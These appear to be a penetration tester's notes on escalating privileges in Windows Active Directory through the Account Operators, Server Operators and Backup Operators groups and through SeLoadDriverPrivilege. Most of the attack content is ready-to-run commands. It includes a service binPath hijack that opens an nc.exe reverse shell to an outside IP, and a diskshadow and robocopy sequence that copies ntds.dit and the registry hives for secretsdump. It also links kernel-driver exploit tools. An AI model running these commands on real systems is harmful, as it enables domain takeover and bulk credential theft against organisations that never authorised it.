## Account Operators
- Allows creating non administrator accounts and groups on the domain
- Allows logging in to the DC locally

However, we can still add new users:
![[image 17.png]]
As well as login to DC01 locally:
![[image 18.png]]

## Server Operators
This membership allows users to configure Domain Controllers with the following privileges:
- Allow log on locally
- Back up files and directories
- Change the system time
- Change the time zone
- Force shutdown from a remote system
- Restore files and directories
- Shut down the system

```
services

sc.exe config VMTools binPath="C:\Users\aarti\Documents\nc.exe -e cmd.exe 192.168.1.205 1234"
```

## Backup Operators
As with `Server Operators` membership, we can access the `DC01` file system if we belong to `Backup Operators`:
![[image 19.png]]
https://github.com/mpgn/BackupOperatorToDA
```
BackupOperatorToDA.exe -t \\dc.red.lab -u peter -p Password123 -d red.lab -o //10.0.0.3/share/BackupOperatorToDA.exe -t \\dc.red.lab -u peter -p Password123 -d red.lab -o C:\temp
```
```
impacket-secretsdump -sam /tmp/share/SAM -system /tmp/share/SYSTEM -security /tmp/share/SECURITY LOCAL
```

If evil-winrm
Create backup.txt:
```
set verbose onX  
set metadata C:\Windows\Temp\meta.cabX  
set context clientaccessibleX  
set context persistentX  
begin backupX  
add volume C: alias cdriveX  
createX  
expose %cdrive% E:X  
end backup
```

```
diskshadow /s backup.txt

robocopy /b E:\Windows\ntds . ntds.dit  
reg save hklm\system c:\temp\system  
download ntds.dit /home/kali/Downloads/Pilfered/lab/ntds.dit  
download C:\Temp\system /home/kali/Downloads/Pilfered/lab/system

```

## SeLoadDriverPrivilege
https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/
A very dangerous privilege to assign to any user - it allows the user to load kernel drivers and execute code with kernel privilges aka `NT\System`. See how `offense\spotless` user has this privilege:

https://github.com/TarlogicSecurity/EoPLoadDriver/
![[ejecucion_eoploaddriver.webp]]
Use capcom to get shell as system
https://github.com/tandasat/ExploitCapcom
![[image 11.avif]]
